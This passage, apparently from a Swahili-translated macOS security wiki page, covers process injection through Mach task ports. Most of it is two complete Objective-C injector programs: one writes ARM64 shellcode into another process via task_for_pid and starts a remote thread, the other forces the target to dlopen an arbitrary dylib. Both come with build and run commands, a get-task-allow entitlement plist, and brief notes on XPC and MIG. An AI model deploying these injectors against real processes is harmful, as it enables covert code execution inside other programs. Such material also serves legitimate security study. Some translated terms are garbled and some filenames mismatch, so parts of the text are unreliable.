Faili hii ina orodha ya ruhusa zilizoidhinishwa kwa programu. Inaweza kujumuisha ruhusa kama vile kufikia folda maalum au kutumia huduma za mfumo. Kwa kawaida, faili hii hupatikana ndani ya mfuko wa programu ya macOS.

### Jinsi ya Kutumia

Unaweza kutumia faili hii kuchambua ruhusa zilizoidhinishwa za programu na kubaini ikiwa kuna nafasi ya kufanya uharibifu wa mchakato au kufanya mwingiliano kati ya michakato.

### Mifano

```xml
<key>com.apple.security.files.user-selected.read-write</key>
<true/>
<key>com.apple.security.print</key>
<true/>
```

Katika mfano huu, programu ina ruhusa ya kusoma na kuandika faili zilizochaguliwa na mtumiaji, pamoja na uwezo wa kuchapisha.

### Tahadhari

Kuhariri faili hii kwa makusudi kunaweza kusababisha programu kufanya vitendo visivyoidhinishwa au hatari kwa usalama wa mfumo. Jihadhari wakati unapobadilisha ruhusa za programu. 
{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**Kupasha** programu iliyopita na uongeze **haki** za kuweza kuingiza msimbo na mtumiaji huyo huyo (kama sivyo utahitaji kutumia **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>  
### Maelezo ya ziada  
Unapotumia mawasiliano ya mchakato wa IPC kati ya mchakato wa kibinafsi na mchakato wa kawaida, unaweza kufanya vitendo vya kukiuka usalama kama vile kusoma au kuandika data ambayo haipaswi kupatikana. Kwa hivyo, ni muhimu kutekeleza hatua madhubuti za kuhakikisha usalama wa mawasiliano ya mchakato wa IPC kwenye mfumo wa MacOS.
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### Uingizaji wa Dylib katika thread kupitia Bandari ya Kazi

Katika macOS **threads** inaweza kudhibitiwa kupitia **Mach** au kutumia **posix `pthread` api**. Thread tuliyounda katika uingizaji uliopita, uliundwa kwa kutumia Mach api, hivyo **haifai kwa posix**.

Ilikuwa inawezekana **kuingiza shellcode rahisi** ili kutekeleza amri kwa sababu **haikuwa inahitaji kufanya kazi na posix** compliant apis, bali tu na Mach. **Uingizaji wa ngumu zaidi** ungehitaji **thread** kuwa pia **posix compliant**.

Hivyo basi, ili **kuboresha thread** ni vyema iitwe **`pthread_create_from_mach_thread`** ambayo ita **umba pthread halali**. Kisha, pthread mpya hii inaweza **kuita dlopen** ili **kupakia dylib** kutoka kwenye mfumo, hivyo badala ya kuandika shellcode mpya kufanya vitendo tofauti ni vyema kupakia maktaba za desturi.

Unaweza kupata **dylibs mfano** katika (kwa mfano ile inayozalisha logi kisha unaweza kuisikiliza):

{% content-ref url="../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../macos-library-injection/macos-dyld-hijacking-and-dyld\_insert_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
```c
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Matumizi: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: njia ya dylib kwenye diski\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib haikupatikana\n");
}

}
```
</details>  
### Maelezo ya Mchakato wa IPC wa macOS

Kwa kawaida, mchakato wa IPC wa macOS unaweza kutumiwa kwa madhumuni mazuri kama vile kubadilishana data kati ya michakato. Hata hivyo, kwa upande mwingine, mchakato wa IPC unaweza pia kutumiwa vibaya kwa kusudi la kukiuka usalama au kufikia mamlaka ya ziada. Kwa hivyo, ni muhimu kuchunguza na kufahamu jinsi mchakato wa IPC unavyofanya kazi ili kuzuia matumizi mabaya.
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Kuteka Mjadala kupitia Bandari ya Kazi <a href="#hatua-1-kuteka-mjadala" id="hatua-1-kuteka-mjadala"></a>

Katika mbinu hii, mjadala wa mchakato unatekwa:

{% content-ref url="macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### Taarifa Msingi

XPC, ambayo inasimama kwa Mawasiliano ya Mchakato wa XNU (jopo la kimsingi linalotumiwa na macOS), ni mfumo wa **mawasiliano kati ya michakato** kwenye macOS na iOS. XPC hutoa njia ya kufanya **wito salama, usio wa moja kwa moja kati ya michakato tofauti** kwenye mfumo. Ni sehemu ya mfumo wa usalama wa Apple, kuruhusu **ujenzi wa programu zilizotenganishwa kwa mamlaka** ambapo kila **sehemu** inaendeshwa na **ruhusa inayohitajika tu** kufanya kazi yake, hivyo kupunguza uharibifu unaoweza kutokea kutokana na mchakato uliokumbwa na shida.

Kwa maelezo zaidi kuhusu jinsi hii **mawasiliano inavyofanya kazi** au jinsi inavyoweza kuwa **dhaifu**, angalia:

{% content-ref url="macos-xpc/" %}
[macos-xpc](macos-xpc/)
{% endcontent-ref %}

## MIG - Mjenzi wa Kiolesura cha Mach

MIG iliundwa ili **kurahisisha mchakato wa uundaji wa nambari ya Mach IPC**. Hii ni kwa sababu kazi nyingi za programu ya RPC zinahusisha hatua sawa (kufunga hoja, kutuma ujumbe, kufungua data kwenye seva...).

MIC kimsingi **inaunda nambari inayohitajika** kwa seva na mteja kufanya mawasiliano na ufafanuzi uliopewa (katika IDL -Lugha ya Ufafanuzi wa Kiolesura-). Hata kama nambari iliyoundwa ni mbaya, mwandishi wa programu atahitaji tu kuagiza na nambari yake itakuwa rahisi sana kuliko hapo awali.

Kwa maelezo zaidi angalia:

{% content-ref url="macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## Marejeo

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
